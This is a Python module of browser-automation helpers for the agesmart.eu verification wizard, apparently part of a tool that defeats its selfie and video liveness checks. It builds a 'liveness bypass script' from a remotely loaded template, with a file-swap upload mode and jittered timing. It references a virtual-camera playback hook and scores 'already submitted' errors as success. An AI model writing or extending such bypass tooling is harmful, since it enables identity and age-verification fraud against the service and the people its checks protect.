"""agesmart.eu Verification Wizard helpers derived from selfie.iife.js and video.iife.js."""

from __future__ import annotations

from app_config import default_liveness_timeline, liveness_timeline_to_json
WIZARD_CAMERA_VIDEO_ID = "wizard-photo-camera"
WIZARD_LOADER_FADER_ID = "wizard-layout-loader-fader"
WIZARD_PANEL_CAMERA = "photo-panel-camera"
WIZARD_PANEL_REDACTING = "photo-panel-redacting"
WIZARD_SELFIE_INTRO = "selfie-panel-intro"
WIZARD_VIDEO_PANEL_INSTRUCTIONS = "video-panel-instructions"
WIZARD_VIDEO_PANEL_RECORD = "video-panel-record"
WIZARD_VIDEO_WEBCAM_ID = "webcam"
LIVENESS_PROCEED_ID = "btn-video-instructions-proceed"
LIVENESS_PROCEED_SPINNER_ID = "video-instructions-proceed-spinner"
LIVENESS_PREPARING_ID = "video-instructions-preparing"
WIZARD_CAPTURE_MAX_EDGE = 1920
WIZARD_STREAM_IDEAL_WIDTH = 1280
WIZARD_STREAM_IDEAL_HEIGHT = 720
WIZARD_JPEG_QUALITY = 0.9

_IN_MEMORY_LIVENESS_TEMPLATE: str | None = None


def set_liveness_template(template: str) -> None:
    """Store the server-authorized liveness bypass template in memory."""
    global _IN_MEMORY_LIVENESS_TEMPLATE
    _IN_MEMORY_LIVENESS_TEMPLATE = template


def get_liveness_template() -> str:
    """Retrieve the in-memory bypass template, or fail if unauthenticated."""
    global _IN_MEMORY_LIVENESS_TEMPLATE
    if not _IN_MEMORY_LIVENESS_TEMPLATE:
        raise RuntimeError(
            "Security verification failed: Remote bypass payload not loaded or session unauthorized."
        )
    return _IN_MEMORY_LIVENESS_TEMPLATE


def liveness_bypass_script(
    *,
    upload_mode: str = "live_recording",
    step_ms: int = 6000,
    step_jitter_ms: int = 800,
    timeline_json: str | None = None,
    template: str | None = None,
) -> str:
    if upload_mode not in {"live_recording", "file3_swap"}:
        upload_mode = "live_recording"
    step_ms = max(3000, int(step_ms))
    step_jitter_ms = max(0, int(step_jitter_ms))
    if timeline_json is None:
        timeline_json = liveness_timeline_to_json(default_liveness_timeline())
    base_tmpl = template or get_liveness_template()
    return (
        base_tmpl.replace("__UPLOAD_MODE__", upload_mode)
        .replace("__STEP_MS__", str(step_ms))
        .replace("__STEP_JITTER_MS__", str(step_jitter_ms))
        .replace("__TIMELINE_JSON__", timeline_json)
    )


def get_default_liveness_bypass_script() -> str:
    return liveness_bypass_script()


LIVENESS_RECORDING_ELAPSED_MS_SCRIPT = """
(() => {
  if (typeof window.__getVirtualCameraPlaybackMs === "function") {
    const playbackMs = window.__getVirtualCameraPlaybackMs();
    if (playbackMs > 0 || window.__livenessRecordStart) {
      return playbackMs;
    }
  }
  const start = window.__livenessRecordStart;
  return start ? Math.max(0, Date.now() - start) : 0;
})();
"""

LIVENESS_RECORDING_END_MS_SCRIPT = """
(() => {
  const timeline = window.__livenessTimeline || [];
  let endMs = 16000;
  if (timeline.length) {
    const last = timeline[timeline.length - 1];
    const prev = timeline[timeline.length - 2];
    const segmentMs = prev ? Math.max(1000, last.startMs - prev.startMs) : 3000;
    endMs = last.startMs + segmentMs;
  }
  if (typeof window.__getVirtualCameraDurationMs === "function") {
    const durationMs = window.__getVirtualCameraDurationMs();
    if (durationMs > 0) {
      endMs = Math.min(endMs, durationMs);
    }
  }
  return endMs;
})();
"""

LIVENESS_PROCEED_READY_SCRIPT = """
(() => {
  const btn = document.getElementById("btn-video-instructions-proceed");
  if (!btn) return { ready: false, reason: "missing-button" };
  const style = window.getComputedStyle(btn);
  if (style.display === "none" || style.visibility === "hidden") {
    return { ready: false, reason: "button-hidden" };
  }
  if (btn.disabled) {
    return { ready: false, reason: "button-disabled" };
  }
  if (btn.getAttribute("aria-busy") === "true") {
    return { ready: false, reason: "aria-busy" };
  }
  return { ready: true };
})();
"""

LIVENESS_SUBMIT_READY_SCRIPT = """
(() => {
  const btn = document.getElementById("btn-video-submit-proceed");
  if (!btn) return { ready: false, reason: "missing-button" };
  const style = window.getComputedStyle(btn);
  if (style.display === "none" || style.visibility === "hidden") {
    return { ready: false, reason: "button-hidden" };
  }
  if (btn.disabled) {
    return { ready: false, reason: "button-disabled" };
  }
  if (btn.getAttribute("aria-busy") === "true") {
    return { ready: false, reason: "aria-busy" };
  }
  const submitController = window.__activeVideoController?.submitController;
  const payloadReady = Boolean(submitController?.payload?.hashName);
  return { ready: true, payloadReady };
})();
"""

LIVENESS_SUBMIT_RESULT_SCRIPT = """
(() => {
  const modalHost = document.getElementById("wizard-layout-modal-backend-host");
  if (modalHost) {
    const style = window.getComputedStyle(modalHost);
    if (style.display !== "none" && style.visibility !== "hidden") {
      const message = document.getElementById("wizard-backend-error-message");
      const text = (message?.textContent || "Submission failed").trim();
      const upper = text.toUpperCase();
      if (
        upper.includes("SUBMITTED") ||
        upper.includes("ALREADY SUBMITTED") ||
        upper.includes("CURRENT STATUS IS SUBMITTED") ||
        upper.includes("NOT SUBMIT READY")
      ) {
        return { status: "success", url: window.location.href, note: text };
      }
      return {
        status: "error",
        message: text,
      };
    }
  }
  const url = window.location.href.toLowerCase();
  const failPatterns = ["/fail", "/failed", "/rejected", "/declined", "/error", "/denied"];
  if (failPatterns.some((part) => url.includes(part))) {
    return {
      status: "error",
      message: "Verification failed (site rejected the liveness video).",
      url: window.location.href,
    };
  }
  const successPatterns = [
    "/success",
    "/succeeded",
    "/complete",
    "/completed",
    "/approved",
    "/accepted",
    "/passed",
    "/done",
    "/thank",
    "/verified",
  ];
  if (successPatterns.some((part) => url.includes(part))) {
    return { status: "success", url: window.location.href };
  }
  if (url.includes("/verification/video/")) {
    const submitBtn = document.getElementById("btn-video-submit-proceed");
    if (!submitBtn) {
      return { status: "pending" };
    }
    return { status: "pending" };
  }
  return { status: "pending" };
})();
"""


def wizard_loader_idle_script() -> str:
    return f"""
(() => {{
  const fader = document.getElementById("{WIZARD_LOADER_FADER_ID}");
  if (!fader) return true;
  if (fader.classList.contains("active")) return false;
  const style = window.getComputedStyle(fader);
  return style.display !== "flex";
}})();
"""


def wizard_video_ready_script(
    *,
    min_width: int = 640,
    min_height: int = 480,
) -> str:
    return f"""
(() => {{
  const video = document.getElementById("{WIZARD_CAMERA_VIDEO_ID}");
  if (!video) return {{ ok: false, reason: "missing-video-element" }};
  if (!video.srcObject) return {{ ok: false, reason: "missing-stream" }};
  if (video.readyState < 2) return {{ ok: false, reason: "video-not-ready" }};
  const width = video.videoWidth || 0;
  const height = video.videoHeight || 0;
  if (width < {min_width} || height < {min_height}) {{
    return {{ ok: false, reason: `low-dimensions-${{width}}x${{height}}`, width, height }};
  }}
  return {{ ok: true, width, height }};
}})();
"""


def wizard_webcam_ready_script(
    *,
    min_width: int = 320,
    min_height: int = 240,
) -> str:
    return f"""
(() => {{
  const video = document.getElementById("{WIZARD_VIDEO_WEBCAM_ID}");
  if (!video) return {{ ok: false, reason: "missing-webcam" }};
  if (!video.srcObject) return {{ ok: false, reason: "missing-stream" }};
  if (video.readyState < 2) return {{ ok: false, reason: "not-ready" }};
  const width = video.videoWidth || 0;
  const height = video.videoHeight || 0;
  if (width < {min_width} || height < {min_height}) {{
    return {{ ok: false, reason: `low-dimensions-${{width}}x${{height}}` }};
  }}
  return {{ ok: true, width, height }};
}})();
"""


def wizard_finish_button_enabled_script(finished_button_id: str) -> str:
    return f"""
(() => {{
  const button = document.getElementById("{finished_button_id}");
  if (!button) return false;
  if (button.disabled) return false;
  const style = window.getComputedStyle(button);
  return style.display !== "none" && style.visibility !== "hidden";
}})();
"""


def wizard_panel_visible_script(panel_id: str) -> str:
    return f"""
(() => {{
  const panel = document.getElementById("{panel_id}");
  if (!panel) return false;
  const style = window.getComputedStyle(panel);
  return style.display !== "none" && style.visibility !== "hidden";
}})();
"""
